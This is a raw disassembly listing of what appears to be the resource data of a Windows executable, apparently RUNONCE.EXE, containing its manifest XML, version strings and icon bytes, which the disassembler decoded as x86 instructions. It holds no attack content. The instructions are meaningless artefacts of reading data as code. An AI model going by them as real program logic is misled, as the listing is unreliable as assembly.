  40a4d4:	imul   esp,DWORD PTR [ebp+0x72],0x22
  40a4d8:	and    BYTE PTR [ebp+0x69],dh
  40a4db:	inc    ecx
  40a4dc:	arpl   WORD PTR [ebx+0x65],sp
  40a4df:	jae    0x40a554
  40a4e1:	cmp    eax,0x6c616622
  40a4e6:	jae    0x40a54d
  40a4e8:	and    ch,BYTE PTR [edi]
  40a4ea:	ds or  eax,0x2020200a
  40a4f0:	and    BYTE PTR [eax],ah
  40a4f2:	and    BYTE PTR [eax],ah
  40a4f4:	and    BYTE PTR [edi+ebp*1],bh
  40a4f7:	jb     0x40a55e
  40a4f9:	jno    0x40a570
  40a4fb:	gs jae 0x40a572
  40a4fe:	gs fs push eax
  40a501:	jb     0x40a56c
  40a503:	jbe    0x40a56e
  40a505:	ins    BYTE PTR es:[edi],dx
  40a506:	gs addr16 gs jae 0x40a549
  40a50b:	or     eax,0x2020200a
  40a510:	and    BYTE PTR [edi+ebp*1],bh
  40a513:	jae    0x40a57a
  40a515:	arpl   WORD PTR [ebp+0x72],si
  40a518:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x2f3c0a0d
  40a520:	je     0x40a594
  40a522:	jne    0x40a597
  40a524:	je     0x40a56f
  40a526:	outs   dx,BYTE PTR ds:[esi]
  40a527:	outs   dx,WORD PTR ds:[esi]
  40a529:	ds or  eax,0x70613c0a
  40a52f:	jo     0x40a59d
  40a531:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40a538:	and    BYTE PTR [eax+0x6d],bh
  40a53b:	ins    BYTE PTR es:[edi],dx
  40a53c:	outs   dx,BYTE PTR ds:[esi]
  40a53d:	jae    0x40a57c
  40a53f:	and    dh,BYTE PTR [ebp+0x72]
  40a542:	outs   dx,BYTE PTR ds:[esi]
  40a543:	cmp    dh,BYTE PTR [ebx+0x63]
  40a546:	push   0x73616d65
  40a54b:	sub    eax,0x7263696d
  40a550:	outs   dx,DWORD PTR ds:[esi]
  40a551:	jae    0x40a5c2
  40a553:	data16 je 0x40a583
  40a556:	arpl   WORD PTR [edi+0x6d],bp
  40a559:	cmp    ah,BYTE PTR [ecx+0x73]
  40a55c:	ins    DWORD PTR es:[edi],dx
  40a55d:	cs jbe 0x40a593
  40a560:	and    bh,BYTE PTR [esi]
  40a562:	or     eax,0x2020200a
  40a567:	and    BYTE PTR [edi+esi*2],bh
  40a56a:	imul   ebp,DWORD PTR [esi+0x64],0x5373776f
  40a571:	gs je  0x40a5e8
  40a574:	imul   ebp,DWORD PTR [esi+0x67],0xa0d3e73
  40a57b:	and    BYTE PTR [eax],ah
  40a57d:	and    BYTE PTR [eax],ah
  40a57f:	and    BYTE PTR [eax],ah
  40a581:	and    BYTE PTR [eax],ah
  40a583:	cmp    al,0x64
  40a585:	jo     0x40a5f0
  40a587:	inc    ecx
  40a588:	ja     0x40a5eb
  40a58a:	jb     0x40a5f1
  40a58c:	and    BYTE PTR [eax],ah
  40a58e:	js     0x40a5fd
  40a590:	ins    BYTE PTR es:[edi],dx
  40a591:	outs   dx,BYTE PTR ds:[esi]
  40a592:	jae    0x40a5d1
  40a594:	and    ch,BYTE PTR [eax+0x74]
  40a597:	je     0x40a609
  40a599:	cmp    ch,BYTE PTR [edi]
  40a59b:	das    
  40a59c:	jae    0x40a601
  40a59e:	push   0x73616d65
  40a5a3:	cs ins DWORD PTR es:[edi],dx
  40a5a5:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40a5ac:	je     0x40a5dc
  40a5ae:	arpl   WORD PTR [edi+0x6d],bp
  40a5b1:	das    
  40a5b2:	push   ebx
  40a5b3:	dec    ebp
  40a5b4:	dec    ecx
  40a5b5:	das    
  40a5b6:	xor    dh,BYTE PTR [eax]
  40a5b8:	xor    BYTE PTR ds:0x6e69572f,dh
  40a5be:	outs   dx,DWORD PTR fs:[esi]
  40a5c0:	ja     0x40a635
  40a5c2:	push   ebx
  40a5c3:	gs je  0x40a63a
  40a5c6:	imul   ebp,DWORD PTR [esi+0x67],0x743e2273
  40a5cd:	jb     0x40a644
  40a5cf:	gs cmp al,0x2f
  40a5d2:	fs jo  0x40a63e
  40a5d5:	inc    ecx
  40a5d6:	ja     0x40a639
  40a5d8:	jb     0x40a63f
  40a5da:	ds or  eax,0x2020200a
  40a5e0:	and    BYTE PTR [edi+ebp*1],bh
  40a5e3:	ja     0x40a64e
  40a5e5:	outs   dx,BYTE PTR ds:[esi]
  40a5e6:	outs   dx,DWORD PTR fs:[esi]
  40a5e8:	ja     0x40a65d
  40a5ea:	push   ebx
  40a5eb:	gs je  0x40a662
  40a5ee:	imul   ebp,DWORD PTR [esi+0x67],0xa0d3e73
  40a5f5:	cmp    al,0x2f
  40a5f7:	popa   
  40a5f8:	jo     0x40a66a
  40a5fa:	ins    BYTE PTR es:[edi],dx
  40a5fb:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40a602:	ds or  eax,0x612f3c0a
  40a608:	jae    0x40a67d
  40a60a:	gs ins DWORD PTR es:[edi],dx
  40a60c:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  40a610:	or     eax,0xa
  40a615:	add    BYTE PTR [eax],al
  40a617:	add    BYTE PTR [eax+0x3403],al
  40a61d:	add    BYTE PTR [esi+0x0],dl
  40a620:	push   ebx
  40a621:	add    BYTE PTR [edi+0x0],bl
  40a624:	push   esi
  40a625:	add    BYTE PTR [ebp+0x0],al
  40a628:	push   edx
  40a629:	add    BYTE PTR [ebx+0x0],dl
  40a62c:	dec    ecx
  40a62d:	add    BYTE PTR [edi+0x0],cl
  40a630:	dec    esi
  40a631:	add    BYTE PTR [edi+0x0],bl
  40a634:	dec    ecx
  40a635:	add    BYTE PTR [esi+0x0],cl
  40a638:	inc    esi
  40a639:	add    BYTE PTR [edi+0x0],cl
  40a63c:	add    BYTE PTR [eax],al
  40a63e:	add    BYTE PTR [eax],al
  40a640:	mov    ebp,0xfeef04
  40a645:	add    BYTE PTR [ecx],al
  40a647:	add    BYTE PTR [eax],al
  40a649:	add    BYTE PTR [edx],cl
  40a64b:	add    BYTE PTR [eax],al
  40a64d:	inc    eax
  40a64e:	add    BYTE PTR [eax],ch
  40a650:	add    BYTE PTR [eax],al
  40a652:	or     al,BYTE PTR [eax]
  40a654:	add    BYTE PTR [eax+0x0],al
  40a657:	sub    BYTE PTR [edi],bh
  40a659:	add    BYTE PTR [eax],al
  40a65b:	add    BYTE PTR [eax],al
  40a65d:	add    BYTE PTR [eax],al
  40a65f:	add    BYTE PTR [eax+eax*1],al
  40a662:	add    al,0x0
  40a664:	add    DWORD PTR [eax],eax
	...
  40a672:	add    BYTE PTR [eax],al
  40a674:	fiadd  WORD PTR [edx]
  40a676:	add    BYTE PTR [eax],al
  40a678:	add    DWORD PTR [eax],eax
  40a67a:	push   ebx
  40a67b:	add    BYTE PTR [eax+eax*1+0x72],dh
  40a67f:	add    BYTE PTR [ecx+0x0],ch
  40a682:	outs   dx,BYTE PTR ds:[esi]
  40a683:	add    BYTE PTR [edi+0x0],ah
  40a686:	inc    esi
  40a687:	add    BYTE PTR [ecx+0x0],ch
  40a68a:	ins    BYTE PTR es:[edi],dx
  40a68b:	add    BYTE PTR [ebp+0x0],ah
  40a68e:	dec    ecx
  40a68f:	add    BYTE PTR [esi+0x0],ch
  40a692:	data16 add BYTE PTR [edi+0x0],ch
  40a696:	add    BYTE PTR [eax],al
  40a698:	mov    edx,0x1000002
  40a69d:	add    BYTE PTR [eax],dh
  40a69f:	add    BYTE PTR [eax+eax*1],dh
  40a6a2:	xor    BYTE PTR [eax],al
  40a6a4:	cmp    DWORD PTR [eax],eax
  40a6a6:	xor    BYTE PTR [eax],al
  40a6a8:	xor    al,0x0
  40a6aa:	inc    edx
  40a6ab:	add    BYTE PTR [eax],dh
  40a6ad:	add    BYTE PTR [eax],al
  40a6af:	add    BYTE PTR [eax+eax*1+0x16],cl
  40a6b3:	add    BYTE PTR [ecx],al
  40a6b5:	add    BYTE PTR [ebx+0x0],al
  40a6b8:	outs   dx,DWORD PTR ds:[esi]
  40a6b9:	add    BYTE PTR [ebp+0x0],ch
  40a6bc:	jo     0x40a6be
  40a6be:	popa   
  40a6bf:	add    BYTE PTR [esi+0x0],ch
  40a6c2:	jns    0x40a6c4
  40a6c4:	dec    esi
  40a6c5:	add    BYTE PTR [ecx+0x0],ah
  40a6c8:	ins    DWORD PTR es:[edi],dx
  40a6c9:	add    BYTE PTR [ebp+0x0],ah
  40a6cc:	add    BYTE PTR [eax],al
  40a6ce:	add    BYTE PTR [eax],al
  40a6d0:	dec    ebp
  40a6d1:	add    BYTE PTR [ecx+0x0],ch
  40a6d4:	arpl   WORD PTR [eax],ax
  40a6d6:	jb     0x40a6d8
  40a6d8:	outs   dx,DWORD PTR ds:[esi]
  40a6d9:	add    BYTE PTR [ebx+0x0],dh
  40a6dc:	outs   dx,DWORD PTR ds:[esi]
  40a6dd:	add    BYTE PTR [esi+0x0],ah
  40a6e0:	je     0x40a6e2
  40a6e2:	and    BYTE PTR [eax],al
  40a6e4:	inc    ebx
  40a6e5:	add    BYTE PTR [edi+0x0],ch
  40a6e8:	jb     0x40a6ea
  40a6ea:	jo     0x40a6ec
  40a6ec:	outs   dx,DWORD PTR ds:[esi]
  40a6ed:	add    BYTE PTR [edx+0x0],dh
  40a6f0:	popa   
  40a6f1:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a6f5:	add    BYTE PTR [edi+0x0],ch
  40a6f8:	outs   dx,BYTE PTR ds:[esi]
  40a6f9:	add    BYTE PTR [eax],al
  40a6fb:	add    BYTE PTR [edx+0x0],cl
  40a6fe:	adc    DWORD PTR [eax],eax
  40a700:	add    DWORD PTR [eax],eax
  40a702:	inc    esi
  40a703:	add    BYTE PTR [ecx+0x0],ch
  40a706:	ins    BYTE PTR es:[edi],dx
  40a707:	add    BYTE PTR [ebp+0x0],ah
  40a70a:	inc    esp
  40a70b:	add    BYTE PTR [ebp+0x0],ah
  40a70e:	jae    0x40a710
  40a710:	arpl   WORD PTR [eax],ax
  40a712:	jb     0x40a714
  40a714:	imul   eax,DWORD PTR [eax],0x740070
  40a71a:	imul   eax,DWORD PTR [eax],0x6e006f
  40a720:	add    BYTE PTR [eax],al
  40a722:	add    BYTE PTR [eax],al
  40a724:	push   edx
  40a725:	add    BYTE PTR [ebp+0x0],dh
  40a728:	outs   dx,BYTE PTR ds:[esi]
  40a729:	add    BYTE PTR [eax],ah
  40a72b:	add    BYTE PTR [edi+0x0],cl
  40a72e:	outs   dx,BYTE PTR ds:[esi]
  40a72f:	add    BYTE PTR [ebx+0x0],ah
  40a732:	add    BYTE PTR gs:[eax],ah
  40a735:	add    BYTE PTR [edi+0x0],dl
  40a738:	jb     0x40a73a
  40a73a:	popa   
  40a73b:	add    BYTE PTR [eax+0x0],dh
  40a73e:	jo     0x40a740
  40a740:	add    BYTE PTR gs:[edx+0x0],dh
  40a744:	add    BYTE PTR [eax],al
  40a746:	add    BYTE PTR [eax],al
  40a748:	data16 add BYTE PTR [ebx],ah
  40a74b:	add    BYTE PTR [ecx],al
  40a74d:	add    BYTE PTR [esi+0x0],al
  40a750:	imul   eax,DWORD PTR [eax],0x65006c
  40a756:	push   esi
  40a757:	add    BYTE PTR [ebp+0x0],ah
  40a75a:	jb     0x40a75c
  40a75c:	jae    0x40a75e
  40a75e:	imul   eax,DWORD PTR [eax],0x6e006f
  40a764:	add    BYTE PTR [eax],al
  40a766:	add    BYTE PTR [eax],al
  40a768:	xor    DWORD PTR [eax],eax
  40a76a:	xor    BYTE PTR [eax],al
  40a76c:	add    BYTE PTR cs:[eax],dh
  40a76f:	add    BYTE PTR [esi],ch
  40a771:	add    BYTE PTR [ecx],dh
  40a773:	add    BYTE PTR [eax],dh
  40a775:	add    BYTE PTR [edx],dh
  40a777:	add    BYTE PTR [eax+eax*1],dh
  40a77a:	xor    BYTE PTR [eax],al
  40a77c:	add    BYTE PTR cs:[ecx],dh
  40a77f:	add    BYTE PTR [esi],dh
  40a781:	add    BYTE PTR [ebx],dh
  40a783:	add    BYTE PTR [eax],bh
  40a785:	add    BYTE PTR [eax+eax*1],dh
  40a788:	and    BYTE PTR [eax],al
  40a78a:	sub    BYTE PTR [eax],al
  40a78c:	je     0x40a78e
  40a78e:	push   0x2e003100
  40a793:	add    BYTE PTR [ecx],dh
  40a795:	add    BYTE PTR ds:0x37003000,dh
  40a79b:	add    BYTE PTR [eax],dh
  40a79d:	add    BYTE PTR [ecx],bh
  40a79f:	add    BYTE PTR ds:0x37003100,ch
  40a7a5:	add    BYTE PTR [eax],dh
  40a7a7:	add    BYTE PTR [eax],dh
  40a7a9:	add    BYTE PTR [ecx],ch
  40a7ab:	add    BYTE PTR [eax],al
  40a7ad:	add    BYTE PTR [eax],al
  40a7af:	add    BYTE PTR [eax],dh
  40a7b1:	add    BYTE PTR [eax],cl
  40a7b3:	add    BYTE PTR [ecx],al
  40a7b5:	add    BYTE PTR [ecx+0x0],cl
  40a7b8:	outs   dx,BYTE PTR ds:[esi]
  40a7b9:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a7bd:	add    BYTE PTR [edx+0x0],dh
  40a7c0:	outs   dx,BYTE PTR ds:[esi]
  40a7c1:	add    BYTE PTR [ecx+0x0],ah
  40a7c4:	ins    BYTE PTR es:[edi],dx
  40a7c5:	add    BYTE PTR [esi+0x0],cl
  40a7c8:	popa   
  40a7c9:	add    BYTE PTR [ebp+0x0],ch
  40a7cc:	add    BYTE PTR gs:[eax],al
  40a7cf:	add    BYTE PTR [edx+0x0],dl
  40a7d2:	jne    0x40a7d4
  40a7d4:	outs   dx,BYTE PTR ds:[esi]
  40a7d5:	add    BYTE PTR [edi+0x0],cl
  40a7d8:	outs   dx,BYTE PTR ds:[esi]
  40a7d9:	add    BYTE PTR [ebx+0x0],ah
  40a7dc:	add    BYTE PTR gs:[eax],al
  40a7df:	add    BYTE PTR [eax+0x1002e00],al
  40a7e5:	add    BYTE PTR [eax+eax*1+0x65],cl
  40a7e9:	add    BYTE PTR [edi+0x0],ah
  40a7ec:	popa   
  40a7ed:	add    BYTE PTR [eax+eax*1+0x43],ch
  40a7f1:	add    BYTE PTR [edi+0x0],ch
  40a7f4:	jo     0x40a7f6
  40a7f6:	jns    0x40a7f8
  40a7f8:	jb     0x40a7fa
  40a7fa:	imul   eax,DWORD PTR [eax],0x680067
  40a800:	je     0x40a802
  40a802:	add    BYTE PTR [eax],al
  40a804:	test   eax,0x4d002000
  40a809:	add    BYTE PTR [ecx+0x0],ch
  40a80c:	arpl   WORD PTR [eax],ax
  40a80e:	jb     0x40a810
  40a810:	outs   dx,DWORD PTR ds:[esi]
  40a811:	add    BYTE PTR [ebx+0x0],dh
  40a814:	outs   dx,DWORD PTR ds:[esi]
  40a815:	add    BYTE PTR [esi+0x0],ah
  40a818:	je     0x40a81a
  40a81a:	and    BYTE PTR [eax],al
  40a81c:	inc    ebx
  40a81d:	add    BYTE PTR [edi+0x0],ch
  40a820:	jb     0x40a822
  40a822:	jo     0x40a824
  40a824:	outs   dx,DWORD PTR ds:[esi]
  40a825:	add    BYTE PTR [edx+0x0],dh
  40a828:	popa   
  40a829:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a82d:	add    BYTE PTR [edi+0x0],ch
  40a830:	outs   dx,BYTE PTR ds:[esi]
  40a831:	add    BYTE PTR [esi],ch
  40a833:	add    BYTE PTR [eax],ah
  40a835:	add    BYTE PTR [ecx+0x0],al
  40a838:	ins    BYTE PTR es:[edi],dx
  40a839:	add    BYTE PTR [eax+eax*1+0x20],ch
  40a83d:	add    BYTE PTR [edx+0x0],dh
  40a840:	imul   eax,DWORD PTR [eax],0x680067
  40a846:	je     0x40a848
  40a848:	jae    0x40a84a
  40a84a:	and    BYTE PTR [eax],al
  40a84c:	jb     0x40a84e
  40a84e:	add    BYTE PTR gs:[ebx+0x0],dh
  40a852:	add    BYTE PTR gs:[edx+0x0],dh
  40a856:	jbe    0x40a858
  40a858:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  40a85d:	add    BYTE PTR [eax],al
  40a85f:	add    BYTE PTR [eax+0x0],al
  40a862:	or     al,0x0
  40a864:	add    DWORD PTR [eax],eax
  40a866:	dec    edi
  40a867:	add    BYTE PTR [edx+0x0],dh
  40a86a:	imul   eax,DWORD PTR [eax],0x690067
  40a870:	outs   dx,BYTE PTR ds:[esi]
  40a871:	add    BYTE PTR [ecx+0x0],ah
  40a874:	ins    BYTE PTR es:[edi],dx
  40a875:	add    BYTE PTR [esi+0x0],al
  40a878:	imul   eax,DWORD PTR [eax],0x65006c
  40a87e:	outs   dx,BYTE PTR ds:[esi]
  40a87f:	add    BYTE PTR [ecx+0x0],ah
  40a882:	ins    DWORD PTR es:[edi],dx
  40a883:	add    BYTE PTR [ebp+0x0],ah
  40a886:	add    BYTE PTR [eax],al
  40a888:	push   edx
  40a889:	add    BYTE PTR [ebp+0x0],dl
  40a88c:	dec    esi
  40a88d:	add    BYTE PTR [edi+0x0],cl
  40a890:	dec    esi
  40a891:	add    BYTE PTR [ebx+0x0],al
  40a894:	inc    ebp
  40a895:	add    BYTE PTR [esi],ch
  40a897:	add    BYTE PTR [ebp+0x0],al
  40a89a:	pop    eax
  40a89b:	add    BYTE PTR [ebp+0x0],al
  40a89e:	add    BYTE PTR [eax],al
  40a8a0:	push   0x0
  40a8a2:	and    eax,0x50000100
  40a8a7:	add    BYTE PTR [edx+0x0],dh
  40a8aa:	outs   dx,DWORD PTR ds:[esi]
  40a8ab:	add    BYTE PTR [eax+eax*1+0x75],ah
  40a8af:	add    BYTE PTR [ebx+0x0],ah
  40a8b2:	je     0x40a8b4
  40a8b4:	dec    esi
  40a8b5:	add    BYTE PTR [ecx+0x0],ah
  40a8b8:	ins    DWORD PTR es:[edi],dx
  40a8b9:	add    BYTE PTR [ebp+0x0],ah
  40a8bc:	add    BYTE PTR [eax],al
  40a8be:	add    BYTE PTR [eax],al
  40a8c0:	dec    ebp
  40a8c1:	add    BYTE PTR [ecx+0x0],ch
  40a8c4:	arpl   WORD PTR [eax],ax
  40a8c6:	jb     0x40a8c8
  40a8c8:	outs   dx,DWORD PTR ds:[esi]
  40a8c9:	add    BYTE PTR [ebx+0x0],dh
  40a8cc:	outs   dx,DWORD PTR ds:[esi]
  40a8cd:	add    BYTE PTR [esi+0x0],ah
  40a8d0:	je     0x40a8d2
  40a8d2:	scas   al,BYTE PTR es:[edi]
  40a8d3:	add    BYTE PTR [eax],ah
  40a8d5:	add    BYTE PTR [edi+0x0],dl
  40a8d8:	imul   eax,DWORD PTR [eax],0x64006e
  40a8de:	outs   dx,DWORD PTR ds:[esi]
  40a8df:	add    BYTE PTR [edi+0x0],dh
  40a8e2:	jae    0x40a8e4
  40a8e4:	scas   al,BYTE PTR es:[edi]
  40a8e5:	add    BYTE PTR [eax],ah
  40a8e7:	add    BYTE PTR [edi+0x0],cl
  40a8ea:	jo     0x40a8ec
  40a8ec:	add    BYTE PTR gs:[edx+0x0],dh
  40a8f0:	popa   
  40a8f1:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a8f5:	add    BYTE PTR [esi+0x0],ch
  40a8f8:	add    BYTE PTR [bx+si],ah
  40a8fb:	add    BYTE PTR [ebx+0x0],dl
  40a8fe:	jns    0x40a900
  40a900:	jae    0x40a902
  40a902:	je     0x40a904
  40a904:	add    BYTE PTR gs:[ebp+0x0],ch
  40a908:	add    BYTE PTR [eax],al
  40a90a:	add    BYTE PTR [eax],al
  40a90c:	inc    esi
  40a90d:	add    BYTE PTR [ecx],dl
  40a90f:	add    BYTE PTR [ecx],al
  40a911:	add    BYTE PTR [eax+0x0],dl
  40a914:	jb     0x40a916
  40a916:	outs   dx,DWORD PTR ds:[esi]
  40a917:	add    BYTE PTR [eax+eax*1+0x75],ah
  40a91b:	add    BYTE PTR [ebx+0x0],ah
  40a91e:	je     0x40a920
  40a920:	push   esi
  40a921:	add    BYTE PTR [ebp+0x0],ah
  40a924:	jb     0x40a926
  40a926:	jae    0x40a928
  40a928:	imul   eax,DWORD PTR [eax],0x6e006f
  40a92e:	add    BYTE PTR [eax],al
  40a930:	xor    DWORD PTR [eax],eax
  40a932:	xor    BYTE PTR [eax],al
  40a934:	add    BYTE PTR cs:[eax],dh
  40a937:	add    BYTE PTR [esi],ch
  40a939:	add    BYTE PTR [ecx],dh
  40a93b:	add    BYTE PTR [eax],dh
  40a93d:	add    BYTE PTR [edx],dh
  40a93f:	add    BYTE PTR [eax+eax*1],dh
  40a942:	xor    BYTE PTR [eax],al
  40a944:	add    BYTE PTR cs:[ecx],dh
  40a947:	add    BYTE PTR [esi],dh
  40a949:	add    BYTE PTR [ebx],dh
  40a94b:	add    BYTE PTR [eax],bh
  40a94d:	add    BYTE PTR [eax+eax*1],dh
  40a950:	add    BYTE PTR [eax],al
  40a952:	add    BYTE PTR [eax],al
  40a954:	inc    esp
  40a955:	add    BYTE PTR [eax],al
  40a957:	add    BYTE PTR [ecx],al
  40a959:	add    BYTE PTR [esi+0x0],dl
  40a95c:	popa   
  40a95d:	add    BYTE PTR [edx+0x0],dh
  40a960:	inc    esi
  40a961:	add    BYTE PTR [ecx+0x0],ch
  40a964:	ins    BYTE PTR es:[edi],dx
  40a965:	add    BYTE PTR [ebp+0x0],ah
  40a968:	dec    ecx
  40a969:	add    BYTE PTR [esi+0x0],ch
  40a96c:	data16 add BYTE PTR [edi+0x0],ch
  40a970:	add    BYTE PTR [eax],al
  40a972:	add    BYTE PTR [eax],al
  40a974:	and    al,0x0
  40a976:	add    al,0x0
  40a978:	add    BYTE PTR [eax],al
  40a97a:	push   esp
  40a97b:	add    BYTE PTR [edx+0x0],dh
  40a97e:	popa   
  40a97f:	add    BYTE PTR [esi+0x0],ch
  40a982:	jae    0x40a984
  40a984:	ins    BYTE PTR es:[edi],dx
  40a985:	add    BYTE PTR [ecx+0x0],ah
  40a988:	je     0x40a98a
  40a98a:	imul   eax,DWORD PTR [eax],0x6e006f
  40a990:	add    BYTE PTR [eax],al
  40a992:	add    BYTE PTR [eax],al
  40a994:	or     DWORD PTR [eax+esi*4],eax
  40a997:	add    al,0x28
  40a999:	add    BYTE PTR [eax],al
  40a99b:	add    BYTE PTR [eax],ah
  40a99d:	add    BYTE PTR [eax],al
  40a99f:	add    BYTE PTR [eax+0x0],al
  40a9a2:	add    BYTE PTR [eax],al
  40a9a4:	add    DWORD PTR [eax],eax
  40a9a6:	add    al,0x0
  40a9a8:	add    BYTE PTR [eax],al
  40a9aa:	add    BYTE PTR [eax],al
  40a9ac:	add    BYTE PTR [edx],al
	...
  40a9c6:	add    BYTE PTR [eax],0x0
  40a9c9:	add    BYTE PTR [eax],0x0
  40a9cc:	add    BYTE PTR [eax+0x800080],al
  40a9d2:	add    BYTE PTR [eax],al
  40a9d4:	add    BYTE PTR [eax],0x80
  40a9d7:	add    BYTE PTR [eax-0x3fffff80],al
  40a9dd:	rol    al,0x0
  40a9e0:	add    BYTE PTR [eax+0x80],0xff
  40a9e7:	add    BYTE PTR [eax],al
  40a9e9:	inc    DWORD PTR [eax]
  40a9eb:	add    BYTE PTR [eax],al
  40a9ed:	(bad)  
  40a9ee:	inc    DWORD PTR [eax]
  40a9f0:	inc    DWORD PTR [eax]
  40a9f2:	add    BYTE PTR [eax],al
  40a9f4:	inc    DWORD PTR [eax]
  40a9f6:	inc    DWORD PTR [eax]
  40a9f8:	(bad)  
  40a9f9:	inc    DWORD PTR [eax]
  40a9fb:	add    bh,bh
  40a9fd:	(bad)  
  40a9fe:	inc    DWORD PTR [eax]
	...
  40aa10:	add    BYTE PTR [edi+0x807777],al
  40aa16:	add    BYTE PTR [eax],al
  40aa18:	or     BYTE PTR [edi+0x78],dh
  40aa1b:	test   DWORD PTR [eax+0x0],0x88ffff8f
  40aa25:	add    BYTE PTR [eax],al
  40aa27:	add    BYTE PTR [eax],al
  40aa29:	xchg   DWORD PTR [edi-0x78],esi
  40aa2c:	ja     0x40a9ae
  40aa2e:	add    BYTE PTR [eax],al
  40aa30:	add    BYTE PTR [edi-0x7f780001],cl
  40aa36:	add    BYTE PTR [eax],al
  40aa38:	add    BYTE PTR [eax],cl
  40aa3a:	sti    
  40aa3b:	sti    
  40aa3c:	sti    
  40aa3d:	sti    
  40aa3e:	add    BYTE PTR [eax],al
  40aa40:	add    BYTE PTR [edi+0x7887ffff],cl
  40aa46:	add    BYTE PTR [eax],al
  40aa48:	add    BYTE PTR [eax],al
  40aa4a:	mov    BYTE PTR [eax+0x808888],cl
  40aa50:	add    BYTE PTR [edi+0x7787ffff],cl
  40aa56:	add    BYTE PTR [eax],0x0
	...
  40aa61:	(bad)  
  40aa62:	(bad)  
  40aa63:	inc    DWORD PTR [edi+0x8077]
	...
  40aa71:	(bad)  
  40aa72:	(bad)  
  40aa73:	inc    DWORD PTR [edi+0x8077]
	...
  40aa81:	dec    esp
  40aa82:	int3   
  40aa83:	int3   
  40aa84:	inc    edi
  40aa85:	ja     0x40aa07
  40aa87:	cmp    BYTE PTR [edi-0x77474041],0x88
  40aa8e:	add    BYTE PTR [eax],al
  40aa90:	add    BYTE PTR [esp+ecx*8-0x34],cl
  40aa94:	inc    esp
  40aa95:	ja     0x40aa17
  40aa97:	mov    BYTE PTR [eax],cl
  40aa99:	mov    BYTE PTR [eax-0x7f777780],cl
  40aa9f:	add    BYTE PTR [eax],al
  40aaa1:	dec    esp
  40aaa2:	int3   
  40aaa3:	int3   
  40aaa4:	inc    esp
  40aaa5:	inc    edi
  40aaa6:	or     BYTE PTR [eax-0x77087890],0x8
  40aaad:	js     0x40aa37
  40aaaf:	add    BYTE PTR [eax],al
  40aab1:	dec    esp
  40aab2:	int3   
  40aab3:	int3   
  40aab4:	inc    esp
  40aab5:	inc    esp
  40aab6:	or     BYTE PTR [eax+0x0],0x0
  40aabd:	js     0x40aa47
  40aabf:	add    BYTE PTR [eax],0x4c
  40aac2:	int3   
  40aac3:	int3   
  40aac4:	add    al,0x44
  40aac6:	inc    eax
  40aac7:	mov    BYTE PTR [edi+0x77],dh
  40aaca:	ja     0x40ab43
  40aacc:	ja     0x40ab46
  40aace:	mov    BYTE PTR [eax-0x7100],al
  40aad4:	add    BYTE PTR [eax+eax*2+0x77],al
  40aad8:	(bad)  
  40aad9:	(bad)  
  40aada:	(bad)  
  40aadb:	(bad)  
  40aadc:	(bad)  
  40aadd:	clc    
  40aade:	mov    BYTE PTR [eax-0x70f8],al
  40aae4:	pop    es
  40aae5:	add    al,0x40
  40aae7:	mov    BYTE PTR [eax-0x77777778],cl
  40aaed:	xchg   DWORD PTR [eax-0x77877780],ecx
  40aaf3:	mov    BYTE PTR [edi-0x10],dh
  40aaf6:	inc    eax
  40aaf7:	add    BYTE PTR [eax],al
  40aaf9:	add    BYTE PTR [eax],al
  40aafb:	add    BYTE PTR [eax],al
  40aafd:	mov    BYTE PTR [eax-0x80],bh
  40ab00:	xchg   DWORD PTR [edi-0x807789],eax
  40ab06:	add    BYTE PTR [eax+0x77777777],cl
  40ab0c:	js     0x40ab16
  40ab0e:	xchg   DWORD PTR [eax+0x7077788f],eax
  40ab14:	mov    BYTE PTR [eax-0x8880],cl
  40ab1a:	(bad)  
  40ab1b:	(bad)  
  40ab1c:	js     0x40aa9e
  40ab1e:	mov    BYTE PTR [eax+0x887f708],al
  40ab24:	(bad)  
  40ab25:	push   DWORD PTR [eax+0x8]
  40ab28:	mov    BYTE PTR [eax-0x7f877078],cl
  40ab2e:	add    BYTE PTR [eax],al
  40ab30:	add    BYTE PTR [edi-0xf790],cl
  40ab36:	jo     0x40ab84
  40ab38:	int3   
  40ab39:	int3   
  40ab3a:	int3   
  40ab3b:	(bad)  
  40ab3c:	js     0x40aabe
  40ab3e:	add    BYTE PTR [eax],al
  40ab40:	add    BYTE PTR [eax],cl
  40ab42:	lock add BYTE PTR [eax-0x33337378],cl
  40ab49:	int3   
  40ab4a:	int3   
  40ab4b:	(bad)  
  40ab4c:	js     0x40aace
  40ab4e:	add    BYTE PTR [eax],al
  40ab50:	add    BYTE PTR [eax],al
  40ab52:	add    BYTE PTR [eax],0x8f
  40ab55:	or     ah,0xcc
  40ab58:	int3   
  40ab59:	int3   
  40ab5a:	int3   
  40ab5b:	(bad)  
  40ab5c:	js     0x40aade
  40ab5e:	add    BYTE PTR [eax],al
  40ab60:	add    BYTE PTR [eax],al
  40ab62:	add    BYTE PTR [eax],al
  40ab64:	pop    DWORD PTR [eax-0x33333334]
  40ab6a:	int3   
  40ab6b:	(bad)  
  40ab6c:	js     0x40aaee
  40ab6e:	add    BYTE PTR [eax],al
  40ab70:	add    BYTE PTR [eax],al
  40ab72:	add    BYTE PTR [eax],al
  40ab74:	pop    DWORD PTR [eax-0x33333332]
  40ab7a:	int3   
  40ab7b:	(bad)  
  40ab7c:	js     0x40aafe
  40ab7e:	add    BYTE PTR [eax],al
  40ab80:	add    BYTE PTR [eax],al
  40ab82:	add    BYTE PTR [eax],al
  40ab84:	pop    DWORD PTR [eax-0x33333332]
  40ab8a:	int3   
  40ab8b:	(bad)  
  40ab8c:	js     0x40ab0e
  40ab8e:	add    BYTE PTR [eax],al
  40ab90:	add    BYTE PTR [eax],al
  40ab92:	add    BYTE PTR [eax],al
  40ab94:	pop    DWORD PTR [eax-0x33333334]
  40ab9a:	int3   
  40ab9b:	(bad)  
  40ab9c:	js     0x40ab1e
  40ab9e:	add    BYTE PTR [eax],al
  40aba0:	add    BYTE PTR [eax],al
  40aba2:	add    BYTE PTR [eax],al
  40aba4:	pop    DWORD PTR [eax+0x0]
  40abaa:	add    BYTE PTR [edi+0x8078],cl
  40abb0:	add    BYTE PTR [eax],al
  40abb2:	add    BYTE PTR [eax],al
